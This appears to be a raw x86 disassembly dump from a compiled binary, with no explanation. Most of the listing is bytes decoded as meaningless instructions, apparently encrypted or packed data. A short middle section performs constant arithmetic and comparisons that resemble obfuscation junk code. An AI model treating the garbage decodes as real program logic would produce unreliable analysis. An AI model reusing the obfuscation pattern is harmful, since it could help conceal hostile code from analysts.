  41b996:	xchg   DWORD PTR [eax+0xbb1fe5e],edi
  41b99c:	lahf   
  41b99d:	ffreep st(7)
  41b99f:	or     al,BYTE PTR [eax+0x7e]
  41b9a2:	jae    0x41b978
  41b9a4:	xchg   DWORD PTR [edi-0x64929731],ebx
  41b9aa:	loopne 0x41ba05
  41b9ac:	push   esi
  41b9ad:	push   0xfdc8af90
  41b9b2:	int3   
  41b9b3:	mov    ebp,0xbc6f7da8
  41b9b8:	jns    0x41b979
  41b9ba:	or     DWORD PTR [esi+ebp*8+0x60],edi
  41b9be:	mov    eax,0x17ac4a08
  41b9c3:	paddw  mm2,QWORD PTR [edx-0x5b]
  41b9c7:	push   eax
  41b9c8:	sub    al,0x34
  41b9ca:	or     al,dl
  41b9cc:	rcr    bh,cl
  41b9ce:	lahf   
  41b9cf:	and    al,0x3a
  41b9d1:	sub    esp,ebp
  41b9d3:	gs dec esp
  41b9d5:	xlat   BYTE PTR ds:[ebx]
  41b9d6:	cmp    DWORD PTR [ebx-0xfbcb57],ecx
  41b9dc:	jmp    0x92a7:0x59d25baf
  41b9e3:	cmp    eax,0x518293c3
  41b9e8:	(bad)  
  41b9e9:	mov    esi,0x5978cbd7
  41b9ee:	jb     0x41ba59
  41b9f0:	sub    bh,bl
  41b9f2:	test   al,0xb2
  41b9f4:	int3   
  41b9f5:	scas   eax,DWORD PTR es:[edi]
  41b9f6:	jmp    0x8ada80dd
  41b9fb:	pop    ss
  41b9fc:	mov    ebp,0x858aa814
  41ba01:	sub    BYTE PTR [eax],dl
  41ba03:	pop    edx
  41ba04:	repnz aam 0x68
  41ba07:	sti    
  41ba08:	aam    0xa6
  41ba0a:	ins    BYTE PTR es:[edi],dx
  41ba0b:	in     eax,0xe4
  41ba0d:	retf   
  41ba0e:	sbb    ebx,DWORD PTR [edi+0x3c]
  41ba11:	loop   0x41b9d8
  41ba13:	pop    cx
  41ba15:	int    0x77
  41ba17:	std    
  41ba18:	cmp    DWORD PTR [esi+0x752e85d4],edx
  41ba1e:	repz out dx,al
  41ba20:	push   ecx
  41ba21:	xor    BYTE PTR [eax-0x27],bl
  41ba24:	into   
  41ba25:	push   ebx
  41ba26:	dec    ebp
  41ba27:	mov    al,bl
  41ba29:	dec    ecx
  41ba2a:	add    BYTE PTR [edi+edx*4+0x6d],cl
  41ba2e:	shl    DWORD PTR [edx],1
  41ba30:	and    DWORD PTR [esi+esi*4+0x9],ebx
  41ba34:	rcl    DWORD PTR [ebp+0x6e4ad3b2],0x67
  41ba3b:	cmp    eax,0xc38a04bd
  41ba40:	inc    esp
  41ba41:	enter  0x47b,0xc
  41ba45:	lods   eax,DWORD PTR ds:[esi]
  41ba46:	test   ch,cl
  41ba48:	jb     0x41ba49
  41ba4a:	mov    ebx,0x1c3e2f8
  41ba4f:	sahf   
  41ba50:	pop    esi
  41ba51:	jne    0x41ba6e
  41ba53:	int    0xcf
  41ba55:	imul   esi,DWORD PTR [esi+0x7b],0xfffffffe
  41ba59:	xor    eax,0x23b69e2b
  41ba5e:	adc    al,BYTE PTR [ebx]
  41ba60:	xchg   DWORD PTR [esi+0x226161c5],ebx
  41ba66:	adc    DWORD PTR [edi+edi*2],ebx
  41ba69:	cmp    ah,cl
  41ba6b:	xchg   esi,eax
  41ba6c:	inc    edi
  41ba6d:	mov    BYTE PTR [eax+0x42d38697],ch
  41ba73:	and    BYTE PTR [eax],al
  41ba75:	xor    cl,BYTE PTR [ebp+eax*1+0x27]
  41ba79:	jp     0x41ba13
  41ba7b:	lahf   
  41ba7c:	jae    0x41ba7e
  41ba7e:	or     DWORD PTR [edi+eiz*4+0x37],ebp
  41ba82:	xchg   ebx,eax
  41ba83:	mov    cl,0xfd
  41ba85:	aam    0x7b
  41ba87:	or     ecx,esi
  41ba89:	push   esp
  41ba8a:	xchg   edx,eax
  41ba8b:	call   0x99ce:0x5c415bab
  41ba92:	mov    al,ds:0x9ef43f1e
  41ba97:	push   cs
  41ba98:	dec    ebp
  41ba99:	call   DWORD PTR [ebp+0x2a82f4a2]
  41ba9f:	xchg   ecx,eax
  41baa0:	dec    ebx
  41baa1:	jnp    0x41bb13
  41baa3:	push   es
  41baa4:	mov    ebp,0x62192ca2
  41baa9:	sub    ecx,DWORD PTR [edx+0x7e]
  41baac:	enter  0x8aa0,0xfa
  41bab0:	push   ebx
  41bab1:	clc    
  41bab2:	dec    esp
  41bab3:	or     eax,0xf91db4ad
  41bab8:	dec    esp
  41bab9:	jmp    0xe0e9:0x805355d8
  41bac0:	fldl2e 
  41bac2:	or     cl,ch
  41bac4:	jmp    0x41bb07
  41bac6:	jbe    0x41bacc
  41bac8:	jle    0x41baf7
  41baca:	cs and eax,0x5fa457c3
  41bad0:	dec    ecx
  41bad1:	js     0x41bb2f
  41bad3:	shr    BYTE PTR [eax+0x68],0x8a
  41bad7:	lahf   
  41bad8:	mov    cl,0x7e
  41bada:	or     al,0x56
  41badc:	push   cs
  41badd:	dec    ecx
  41bade:	fstp   TBYTE PTR [ebx-0x1]
  41bae1:	je     0x41ba81
  41bae3:	mov    al,ds:0xf505e03d
  41bae8:	push   esi
  41bae9:	push   cs
  41baea:	mov    BYTE PTR [ebx],ah
  41baec:	inc    ecx
  41baed:	out    0xc1,eax
  41baef:	popa   
  41baf0:	in     al,0xa1
  41baf2:	mov    edx,DWORD PTR [edi-0x59]
  41baf5:	push   esi
  41baf6:	(bad)  
  41baf7:	push   eax
  41baf8:	imul   DWORD PTR [esi]
  41bafa:	mov    ch,0xa3
  41bafc:	test   DWORD PTR [edi*8+0x40ca320a],edx
  41bb03:	mov    ebp,0x1feed1b
  41bb08:	stos   DWORD PTR es:[edi],eax
  41bb09:	mov    esp,0x87a87277
  41bb0e:	clc    
  41bb0f:	mov    bl,bl
  41bb11:	(bad)  
  41bb12:	fdiv   QWORD PTR ds:0x39cf916e
  41bb18:	aam    0x10
  41bb1a:	test   al,0x88
  41bb1c:	cdq    
  41bb1d:	std    
  41bb1e:	push   edx
  41bb1f:	lahf   
  41bb20:	out    dx,al
  41bb21:	sub    eax,0x918c2df9
  41bb26:	mov    al,0x39
  41bb28:	out    0x86,eax
  41bb2a:	lods   eax,DWORD PTR ds:[esi]
  41bb2b:	pusha  
  41bb2c:	jl     0x41bada
  41bb2e:	inc    eax
  41bb2f:	icebp  
  41bb30:	je     0x41bb64
  41bb32:	out    dx,eax
  41bb33:	push   eax
  41bb34:	imul   edi,DWORD PTR [eax+edi*2+0x14],0x43
  41bb39:	jbe    0x41bb6e
  41bb3b:	sbb    BYTE PTR [esi-0x47419d18],bh
  41bb41:	addr16 pop edi
  41bb43:	adc    bh,BYTE PTR [esi+0x78]
  41bb46:	popf   
  41bb47:	push   eax
  41bb48:	sbb    al,0xf2
  41bb4a:	pop    ebx
  41bb4b:	dec    ebx
  41bb4c:	rcl    BYTE PTR [ebx-0x292cf46d],0x4d
  41bb53:	cmp    al,0xdb
  41bb55:	xor    eax,0xb5793e69
  41bb5a:	mov    ebx,fs
  41bb5c:	add    eax,0x653a31cf
  41bb61:	jge    0x41bb82
  41bb63:	add    BYTE PTR [ecx],0x11
  41bb66:	jae    0x41bb09
  41bb68:	lods   al,BYTE PTR ds:[esi]
  41bb69:	int    0x23
  41bb6b:	jno    0x41bb03
  41bb6d:	lods   eax,DWORD PTR ds:[esi]
  41bb6e:	push   edx
  41bb6f:	shl    BYTE PTR [edi-0xa],1
  41bb72:	rcr    eax,1
  41bb74:	xchg   BYTE PTR [ebp+0x2c085808],bh
  41bb7a:	and    al,0x72
  41bb7c:	mov    edx,0x653a85c5
  41bb81:	jae    0x41bba2
  41bb83:	imul   esp,DWORD PTR [esi+0x3406e982],0x88f6cbcb
  41bb8d:	dec    ecx
  41bb8e:	aam    0xf9
  41bb90:	nop
  41bb91:	retf   
  41bb92:	fldenv [edx+0x69]
  41bb95:	int    0x7f
  41bb97:	cmp    ecx,DWORD PTR [esi-0x27]
  41bb9a:	add    al,0x76
  41bb9c:	inc    esi
  41bb9d:	jnp    0x41bb56
  41bb9f:	jge    0x41bbc0
  41bba1:	jo     0x41bc0d
  41bba3:	cmp    BYTE PTR [edx],bh
  41bba5:	push   cs
  41bba6:	inc    ebx
  41bba7:	mov    eax,0x1e79da18
  41bbac:	dec    esi
  41bbad:	fimul  DWORD PTR [eax+0x43f8d616]
  41bbb3:	fdivr  st,st(0)
  41bbb5:	jae    0x41bbc8
  41bbb7:	mov    cl,0xfe
  41bbb9:	mov    al,ds:0x7959f589
  41bbbe:	sub    eax,DWORD PTR [eax+0x5f827f8e]
  41bbc4:	adc    al,0xee
  41bbc6:	test   DWORD PTR [esi+0x4a],ecx
  41bbc9:	cli    
  41bbca:	sub    BYTE PTR [ebx+0x557eb925],cl
  41bbd0:	xchg   ebx,eax
  41bbd1:	shl    BYTE PTR [esi+0x23],cl
  41bbd4:	retf   0x8b66
  41bbd7:	push   esp
  41bbd8:	and    al,0x24
  41bbda:	or     cx,dx
  41bbdd:	mov    dx,WORD PTR [esp+0x2c]
  41bbe2:	add    cx,dx
  41bbe5:	or     ecx,0x3b22
  41bbeb:	mov    WORD PTR [esp+0x3c],cx
  41bbf0:	jmp    0x41bfbf
  41bbf5:	inc    edx
  41bbf6:	pop    edx
  41bbf7:	push   ecx
  41bbf8:	fwait
  41bbf9:	xor    DWORD PTR [edx+0x237b5a22],ebx
  41bbff:	pop    ecx
  41bc00:	stos   BYTE PTR es:[edi],al
  41bc01:	mov    bl,0xf6
  41bc03:	xor    eax,0x1681036a
  41bc08:	sbb    BYTE PTR [edx+edx*1+0x64571818],bh
  41bc0f:	jl     0x41bc37
  41bc11:	and    eax,0xd24e1285
  41bc16:	arpl   WORD PTR [ebp+0x5d],sp
  41bc19:	mov    BYTE PTR [ebx],ch
  41bc1b:	jnp    0x41bbad
  41bc1d:	iret   
  41bc1e:	scas   al,BYTE PTR es:[edi]
  41bc1f:	fwait
  41bc20:	(bad)  
  41bc21:	pusha  
  41bc22:	sub    eax,0x8976201
  41bc27:	dec    edx
  41bc28:	and    eax,0x47e6f9b0
  41bc2d:	jmp    0xbd92:0x4ef6f1c
  41bc34:	add    esp,ecx
  41bc36:	dec    ecx
  41bc37:	shl    cl,0xac
  41bc3a:	adc    al,0xc5
  41bc3c:	lds    esp,FWORD PTR [eax]
  41bc3e:	cmp    al,BYTE PTR [edx-0x65d9bc02]
  41bc44:	cmp    eax,0xd90be683
  41bc49:	ds cmp eax,0x2da79ebe
  41bc4f:	jno    0x41bc43
  41bc51:	jge    0x41bc60
  41bc53:	push   ss
  41bc54:	scas   al,BYTE PTR es:[edi]
  41bc55:	dec    DWORD PTR [edx]
  41bc57:	fnstcw WORD PTR ds:[ebx-0x65]
  41bc5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc5c:	xchg   DWORD PTR [eax],edi
  41bc5e:	or     al,0xb0
  41bc60:	inc    edx
  41bc61:	cli    
  41bc62:	cmp    eax,ebp
  41bc64:	jmp    0x41bc8a
  41bc66:	sub    DWORD PTR [ebx],ebx
  41bc68:	daa    
  41bc69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc6a:	xlat   BYTE PTR ds:[ebx]
  41bc6b:	mov    WORD PTR [ebx],gs
  41bc6d:	mov    al,0x87
  41bc6f:	push   cs
  41bc70:	lods   eax,DWORD PTR ds:[esi]
  41bc71:	pop    ss
  41bc72:	jo     0x41bca2
  41bc74:	cs in  al,0x52
  41bc77:	inc    ebp
  41bc78:	icebp  
  41bc79:	mov    esp,0xe35ca148
  41bc7e:	repz aas 
  41bc80:	ret    0x2b26
  41bc83:	mov    eax,ds
  41bc85:	push   edx
  41bc86:	cmp    eax,0x40b4797e
  41bc8b:	and    ch,BYTE PTR [esi+0x39ef04b8]
  41bc91:	scas   al,BYTE PTR es:[edi]
  41bc92:	xchg   esp,eax
  41bc93:	sub    ebx,esp
  41bc95:	push   ecx
  41bc96:	jge    0x41bcdd
  41bc98:	pusha  
  41bc99:	cmp    ch,BYTE PTR [eax]
  41bc9b:	fmul   st(2),st
  41bc9d:	dec    edx
  41bc9e:	add    DWORD PTR [eax+ebx*8-0x6d],ebx
  41bca2:	push   0xda526564
  41bca7:	call   0x3496:0x44263ae6
  41bcae:	xchg   ecx,eax
  41bcaf:	ret    0xb227
  41bcb2:	and    BYTE PTR [esi+edi*4],dl
  41bcb5:	mov    esi,0xeace9cb3
  41bcba:	cmp    dh,0x9f
  41bcbd:	or     eax,0xac3c9a6f
  41bcc2:	fcmovb st,st(6)
  41bcc4:	mov    al,bh
  41bcc6:	pop    edi
  41bcc7:	gs fs jp 0x41bd0a
  41bccb:	inc    edx
  41bccc:	add    esi,DWORD PTR [esi]
  41bcce:	sbb    DWORD PTR [ebp-0x46b932b9],ebp
  41bcd4:	dec    ebp
  41bcd5:	xchg   esi,eax
  41bcd6:	adc    DWORD PTR ds:0x3fa6fa63,esp
  41bcdc:	adc    dl,BYTE PTR fs:[ebp-0x36]
  41bce0:	fs in  al,0x21
  41bce3:	and    BYTE PTR [edi-0x5f],ah
  41bce6:	pop    es
  41bce7:	jecxz  0x41bc74
  41bce9:	inc    ebp
  41bcea:	lock jb 0x41bd00
  41bced:	and    DWORD PTR [ebx+0x4a],0xffffffb3
  41bcf1:	cld    
  41bcf2:	mov    al,0x23
  41bcf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcf5:	mov    dl,BYTE PTR [esi-0x4f]
  41bcf8:	pusha  
  41bcf9:	sbb    BYTE PTR [ecx-0x301dbccb],cl
  41bcff:	das    
  41bd00:	scas   al,BYTE PTR es:[edi]
  41bd01:	aaa    
  41bd02:	outs   dx,BYTE PTR ds:[esi]
  41bd03:	sub    eax,0x2a0dda92
  41bd08:	(bad)  
  41bd09:	lods   eax,DWORD PTR ds:[esi]
  41bd0a:	dec    edi
  41bd0b:	pop    ebx
  41bd0c:	cmp    cl,BYTE PTR [ebp+0xe]
  41bd0f:	dec    edi
  41bd10:	cmp    dh,al
  41bd12:	ror    eax,cl
  41bd14:	push   ds
  41bd15:	xor    BYTE PTR [ebp-0x9],dl
  41bd18:	aam    0x67
  41bd1a:	dec    edi
  41bd1b:	add    DWORD PTR [ecx],0x871549b5
  41bd21:	shl    DWORD PTR [esi-0x1d],1
  41bd24:	jle    0x41bcf5
  41bd26:	enter  0x7a50,0xb
  41bd2a:	shr    bl,0xb2
  41bd2d:	mov    eax,ds:0xcf80b724
  41bd32:	mov    WORD PTR [ecx-0x68],?
  41bd35:	pop    ss
  41bd36:	(bad)  [ebx+0x46]
  41bd39:	lahf   
  41bd3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd3b:	mov    ds:0xee1267c0,al
  41bd40:	in     al,dx
  41bd41:	push   edx
  41bd42:	push   ecx
  41bd43:	in     al,dx
  41bd44:	mov    eax,ds:0xb5e47836
  41bd49:	sbb    al,dh
  41bd4b:	push   ecx
  41bd4c:	leave  
  41bd4d:	les    ebp,FWORD PTR [ebx]
  41bd4f:	repz (bad) 
  41bd52:	outs   dx,DWORD PTR ds:[esi]
  41bd53:	cdq    
  41bd54:	mov    ch,0x67
  41bd56:	mov    ch,0x3c
  41bd58:	mov    dl,0x9d
  41bd5a:	push   es
  41bd5b:	arpl   dx,cx
  41bd5d:	shr    DWORD PTR [ecx],cl
  41bd5f:	int    0x76
  41bd61:	sub    bh,al
  41bd63:	mov    ah,0xbf
  41bd65:	fwait
  41bd66:	lods   eax,DWORD PTR ds:[esi]
  41bd67:	mov    dh,BYTE PTR [ecx-0xc803ff]
  41bd6d:	scas   eax,DWORD PTR es:[edi]
  41bd6e:	fadd   QWORD PTR fs:[ebp-0x631b096a]
  41bd75:	xchg   BYTE PTR [ebp-0x2],ch
  41bd78:	outs   dx,DWORD PTR ds:[esi]
  41bd79:	pushf  
  41bd7a:	jnp    0x41bd91
  41bd7c:	mov    DWORD PTR [ecx+0x9a217c7],esp
  41bd82:	ret    0xafb4
  41bd85:	sbb    bh,ch
  41bd87:	push   es
  41bd88:	imul   ecx,DWORD PTR [edi-0x462cbcea],0x34
  41bd8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd90:	outs   dx,BYTE PTR ds:[esi]
  41bd91:	jmp    0x9ac729de
  41bd96:	add    eax,0xd326ab65
  41bd9b:	mov    ds:0xb2b75be2,eax
  41bda0:	sbb    cl,BYTE PTR ds:0xfbc60857
  41bda6:	scas   al,BYTE PTR es:[edi]
  41bda7:	add    BYTE PTR [eax+0x18],dh
  41bdaa:	pop    esp
  41bdab:	clc    
  41bdac:	shl    BYTE PTR [ebx],cl
  41bdae:	gs and ebx,0x4afb735e
  41bdb5:	pop    ecx
  41bdb6:	(bad)  
  41bdb7:	out    dx,al
  41bdb8:	and    ebp,DWORD PTR [eax]
  41bdba:	arpl   WORD PTR [esi],bx
  41bdbc:	loop   0x41bdcd
  41bdbe:	sub    eax,0x5ff9b0ce
  41bdc3:	retf   0xa26d
  41bdc6:	ins    DWORD PTR es:[edi],dx
  41bdc7:	pop    ebp
  41bdc8:	xchg   ecx,eax
  41bdc9:	cs into 
  41bdcb:	lea    ecx,[ebp-0x4f89892d]
  41bdd1:	dec    esi
  41bdd2:	xchg   esp,eax
  41bdd3:	loope  0x41bdc9
  41bdd5:	sbb    eax,0x973d483
  41bdda:	mov    edi,0xdd75271d
  41bddf:	inc    edx
  41bde0:	clc    
  41bde1:	push   esp
  41bde2:	inc    eax
  41bde3:	test   al,0xad
  41bde5:	out    0xa,eax
  41bde7:	mov    ebp,0x7870bae2
  41bdec:	push   esi
  41bded:	(bad)  
  41bdee:	les    ebx,FWORD PTR [eax-0x5ddd892c]
  41bdf4:	in     al,dx
  41bdf5:	(bad)  
  41bdf6:	sahf   
  41bdf7:	jnp    0x41be35
  41bdf9:	push   ss
  41bdfa:	cs or  al,0x46
  41bdfd:	mov    ah,0xc3
  41bdff:	sbb    BYTE PTR [ecx-0x5ead3237],dh
  41be05:	in     eax,dx
  41be06:	loope  0x41be05
  41be08:	dec    edi
  41be09:	cmp    DWORD PTR [esi+0x75036d02],eax
  41be0f:	(bad)  
  41be10:	push   0xfffffffd
  41be12:	sub    ch,cl
  41be14:	mov    bl,0xa0
  41be16:	jmp    0x3089e404
  41be1b:	mov    dh,0xf
  41be1d:	lods   al,BYTE PTR ds:[esi]
  41be1e:	mov    cl,0xa5
  41be20:	ds call 0xfac7:0xdee51550
  41be28:	mov    ebx,0xbe362697
  41be2d:	and    bl,ch
  41be2f:	jp     0x41bdf7
  41be31:	cmp    edi,DWORD PTR [ebx-0x60412b34]
  41be37:	pop    esp
  41be38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be39:	iret   
  41be3a:	outs   dx,BYTE PTR ds:[esi]
  41be3b:	loopne 0x41bdf8
  41be3d:	mov    ds,ebp
  41be3f:	dec    ecx
  41be40:	mov    DWORD PTR [edx],edx
  41be42:	je     0x41bdf1
  41be44:	mov    al,0x80
  41be46:	ret    0x89eb
  41be49:	and    al,0x1
  41be4b:	dec    esp
  41be4c:	in     eax,0x64
  41be4e:	sbb    ebp,edx
  41be50:	mov    bh,0x40
  41be52:	xlat   BYTE PTR ds:[ebx]
  41be53:	cs (bad) 
  41be55:	stc    
  41be56:	jle    0x41be7f
  41be58:	mov    dl,BYTE PTR [edi]
  41be5a:	fistp  WORD PTR ds:0x1cecf58c
  41be60:	das    
  41be61:	aam    0xe8
  41be63:	fst    QWORD PTR [ecx]
  41be65:	loopne 0x41be8b
  41be67:	xchg   BYTE PTR [ecx+ebx*2-0x37],bh
  41be6b:	xor    esp,DWORD PTR [eax]
  41be6d:	add    eax,0xb5be8dbe
  41be72:	outs   dx,DWORD PTR ds:[esi]
  41be73:	mov    ds,WORD PTR ds:0xc8759a01
  41be79:	hlt    
  41be7a:	aaa    
  41be7b:	xchg   ebx,eax
  41be7c:	pop    eax
  41be7d:	sbb    al,0x90
  41be7f:	mov    al,0x28
  41be81:	cli    
  41be82:	jno    0x41be1d
  41be84:	sbb    al,cl
  41be86:	out    dx,al
  41be87:	sbb    al,0x65
  41be89:	jno    0x41beb7
  41be8b:	stos   BYTE PTR es:[edi],al
  41be8c:	mov    al,0x8c
  41be8e:	ja     0x41be44
  41be90:	pop    ebp
  41be91:	inc    ebp
  41be92:	xchg   esp,eax
  41be93:	ss inc ebx
  41be95:	cmovbe edi,DWORD PTR [edx]
  41be98:	xor    ebx,0x3374f2e1
  41be9e:	leave  
  41be9f:	cdq    
  41bea0:	push   edi
  41bea1:	sub    ch,dh
  41bea3:	mov    WORD PTR ds:0xd769328c,gs
  41bea9:	inc    ebp
  41beaa:	inc    ebp
  41beab:	cmp    dh,BYTE PTR [edx+0x3b07e2ca]
  41beb1:	push   esi
  41beb2:	arpl   cx,sp
  41beb4:	sbb    al,0x5d
  41beb6:	push   cs
  41beb7:	mov    al,0xac
  41beb9:	cmp    bl,BYTE PTR [edx-0x39]
  41bebc:	inc    edi
  41bebd:	je     0x41bf30
  41bebf:	or     ecx,DWORD PTR [esi+0x7f461c32]
  41bec5:	cmp    esi,DWORD PTR [esp+edi*2]
  41bec8:	bound  ebx,QWORD PTR [eax-0xcaa6c95]
  41bece:	jmp    0x1bea:0xbf9248f1
  41bed5:	pop    edi
  41bed6:	icebp  
  41bed7:	inc    edi
  41bed8:	jle    0x41becb
  41beda:	sub    al,0xef
  41bedc:	push   DWORD PTR [esi+0x21c819a1]
  41bee2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bee3:	add    DWORD PTR [ecx+ecx*4+0x3e],0xffffffe0
  41bee8:	push   ebx
  41bee9:	cmc    
  41beea:	xchg   esi,eax
  41beeb:	stos   BYTE PTR es:[edi],al
  41beec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41beed:	mov    cl,0xdd
  41beef:	push   ebx
  41bef0:	xlat   BYTE PTR ds:[ebx]
  41bef1:	jmp    0x7f269dd6
  41bef6:	in     al,dx
  41bef7:	arpl   WORD PTR [ecx+0x3e60d496],ax
  41befd:	cmp    esi,DWORD PTR [esi-0x67]
  41bf00:	mov    eax,ds:0x804df9cc
  41bf05:	in     al,0xb6
  41bf07:	pushf  
  41bf08:	inc    ecx
  41bf09:	mov    edi,0xefa7c2fb
  41bf0e:	add    BYTE PTR [ebx+eax*8-0x69648789],dl
  41bf15:	test   al,0x44
  41bf17:	mov    cl,0x5f
  41bf19:	jecxz  0x41bf40
  41bf1b:	(bad)  
  41bf1c:	repnz ror BYTE PTR [edx+0x1aab091f],1
  41bf23:	sahf   
  41bf24:	(bad)  
  41bf25:	iret   
  41bf26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf27:	jl     0x41bf22
  41bf29:	mov    eax,0x2fbd992d
  41bf2e:	pop    esp
  41bf2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf30:	adc    BYTE PTR [edx],bl
  41bf32:	dec    esi
  41bf33:	and    ch,cl
  41bf35:	mov    ecx,0xb8e35602
  41bf3a:	jno    0x41bfaf
  41bf3c:	stos   DWORD PTR es:[edi],eax
  41bf3d:	arpl   WORD PTR [edi+0x14],cx
  41bf40:	test   eax,0x2e0e11fa
  41bf45:	das    
  41bf46:	and    cl,dh
  41bf48:	inc    ecx
  41bf49:	or     eax,0x254101bc
  41bf4e:	sub    esi,0xfffffff8
  41bf51:	mov    ds:0xad05b290,eax
  41bf56:	out    dx,eax
  41bf57:	adc    DWORD PTR [edx+0x108de9e9],ecx
  41bf5d:	cld    
  41bf5e:	lods   al,BYTE PTR ds:[esi]
  41bf5f:	jmp    0x41bee1
  41bf61:	fwait
  41bf62:	jmp    0x2c2c0bdc
  41bf67:	xchg   edx,eax
  41bf68:	cmc    
  41bf69:	inc    esi
  41bf6a:	sahf   
  41bf6b:	or     DWORD PTR [ebx+0x74],esi
  41bf6e:	out    dx,al
  41bf6f:	xchg   ebx,eax
  41bf70:	(bad)  
  41bf71:	fidiv  DWORD PTR [edi-0x7e44fa15]
  41bf77:	mov    ds:0x4caf728b,eax
  41bf7c:	mov    DWORD PTR [esi-0x32ec9ea3],eax
  41bf82:	test   DWORD PTR [edx],ecx
  41bf84:	xchg   BYTE PTR [ebx],dl
  41bf86:	xor    bh,ch
  41bf88:	dec    ebx
  41bf89:	hlt    
  41bf8a:	addr16 jge 0x41bf74
  41bf8d:	sbb    eax,0x49b5c056
  41bf92:	into   
  41bf93:	cmp    eax,0xb4d3bfae
  41bf98:	mov    esi,0x3664ba4a
  41bf9d:	ss stos DWORD PTR es:[edi],eax
  41bf9f:	push   0xffffffbc
  41bfa1:	cmp    bh,BYTE PTR [esi-0x25c61e74]
  41bfa7:	out    dx,al
  41bfa8:	cs sub BYTE PTR es:[edi+ebx*1-0x6624b702],bl
  41bfb1:	dec    esp
  41bfb2:	enter  0xe1a4,0xa1
  41bfb6:	cmp    DWORD PTR [ebp-0x46270acf],edx
  41bfbc:	and    bh,dl
  41bfbe:	xor    edi,DWORD PTR [ecx+0x57d4]
  41bfc4:	mov    WORD PTR [esp+0x2c],cx
  41bfc9:	mov    ecx,0x3b21
  41bfce:	mov    WORD PTR [esp+0x38],cx
  41bfd3:	mov    ecx,0x52fd
  41bfd8:	mov    WORD PTR [esp+0x24],cx
  41bfdd:	mov    ecx,0x2ce0
  41bfe2:	mov    WORD PTR [esp+0xc],cx
  41bfe7:	mov    cx,WORD PTR [esp+0xc]
  41bfec:	mov    dx,WORD PTR [esp+0x24]
  41bff1:	or     cx,dx
  41bff4:	mov    edx,0x21a4
  41bff9:	or     cx,dx
  41bffc:	mov    dx,WORD PTR [esp+0x2c]
  41c001:	sub    cx,dx
  41c004:	mov    dx,WORD PTR [esp+0x38]
  41c009:	sub    cx,dx
  41c00c:	mov    dx,WORD PTR [esp+0x3c]
  41c011:	cmp    dx,cx
  41c014:	jbe    0x41c888
  41c01a:	mov    ecx,0x5008
  41c01f:	mov    WORD PTR [esp+0x24],cx
  41c024:	mov    ecx,0x60ce
  41c029:	mov    WORD PTR [esp+0xc],cx
  41c02e:	movzx  ecx,WORD PTR [esp+0xc]
  41c033:	mov    edx,0x2095
  41c038:	or     cx,dx
  41c03b:	mov    dx,WORD PTR [esp+0x24]
  41c040:	sub    cx,dx
  41c043:	mov    edx,0x10de
  41c048:	or     ecx,0x742f
  41c04e:	imul   ecx,ecx,0x30b2
  41c054:	mov    WORD PTR [esp+0x3c],cx
  41c059:	mov    ecx,0x6143
  41c05e:	mov    WORD PTR [esp+0x38],cx
  41c063:	mov    ecx,0x679f
  41c068:	mov    WORD PTR [esp+0x2c],cx
  41c06d:	mov    ecx,0x1210
  41c072:	mov    WORD PTR [esp+0x24],cx
  41c077:	mov    ecx,0x3308
  41c07c:	mov    WORD PTR [esp+0xc],cx
  41c081:	mov    cx,WORD PTR [esp+0xc]
  41c086:	sub    cx,dx
  41c089:	mov    dx,WORD PTR [esp+0x24]
  41c08e:	xor    cx,dx
  41c091:	mov    dx,WORD PTR [esp+0x2c]
  41c096:	imul   cx,dx
  41c09a:	mov    dx,WORD PTR [esp+0x38]
  41c09f:	and    cx,dx
  41c0a2:	mov    edx,0x694c
  41c0a7:	and    cx,dx
  41c0aa:	mov    dx,WORD PTR [esp+0x3c]
  41c0af:	cmp    dx,cx
  41c0b2:	ja     0x41c888
  41c0b8:	mov    ecx,DWORD PTR [esp+0x18]
  41c0bc:	mov    edx,DWORD PTR [esp+0x1c]
  41c0c0:	shrd   ecx,edx,0x2
  41c0c4:	xor    ecx,eax
  41c0c6:	mov    eax,DWORD PTR [esp+0x18]
  41c0ca:	shr    edx,0x2
  41c0cd:	mov    edx,DWORD PTR [esp+0x1c]
  41c0d1:	xor    edx,edx
  41c0d3:	or     edx,ecx
  41c0d5:	push   edx
  41c0d6:	push   esi
  41c0d7:	shl    eax,0x1e
  41c0da:	push   edi
  41c0db:	lea    eax,[esp+0x7c]
  41c0df:	push   eax
  41c0e0:	lea    eax,[esp+0x28]
  41c0e4:	push   eax
  41c0e5:	jmp    0x41c4b4
  41c0ea:	in     eax,0x66
  41c0ec:	sar    BYTE PTR [ebx],1
  41c0ee:	dec    edx
  41c0ef:	sbb    esp,DWORD PTR [edx+0x1e]
  41c0f2:	icebp  
  41c0f3:	scas   eax,DWORD PTR es:[edi]
  41c0f4:	mov    ch,0x7c
  41c0f6:	imul   esp,DWORD PTR [edi+0x23],0x1679a7aa
  41c0fd:	sbb    BYTE PTR [edx+edx*1+0x22801818],bh
  41c104:	inc    edx
  41c105:	daa    
  41c106:	jo     0x41c11f
  41c108:	adc    ah,BYTE PTR [di]
  41c10b:	sub    BYTE PTR [ebx],cl
  41c10d:	and    DWORD PTR [edi],edx
  41c10f:	and    eax,0xa0535b31
  41c114:	sub    BYTE PTR ds:0x335239ba,cl
  41c11a:	mov    dl,0x26
  41c11c:	add    BYTE PTR [esi-0x60],dh
  41c11f:	add    eax,0xd218af62
  41c124:	sbb    eax,0x11c58b16
  41c129:	shl    ecx,0xa7
  41c12c:	daa    
  41c12d:	shl    BYTE PTR [ebp-0x3],cl
  41c130:	sbb    eax,0xe454dbd7
  41c135:	paddd  mm4,QWORD PTR [edi-0x7dae1d0d]
  41c13c:	int    0xfd
  41c13e:	mov    bl,0x84
  41c140:	retf   0xf11a
  41c143:	push   esp
  41c144:	mov    ebp,0x825b9085
  41c149:	mov    ebp,0xbc0302e4
  41c14e:	sbb    bh,BYTE PTR cs:[esi+esi*1-0x61454418]
  41c156:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c157:	loop   0x41c17a
  41c159:	pop    ss
  41c15a:	xchg   BYTE PTR [edi+0x61],ah
  41c15d:	sub    eax,0xdc58f1f4
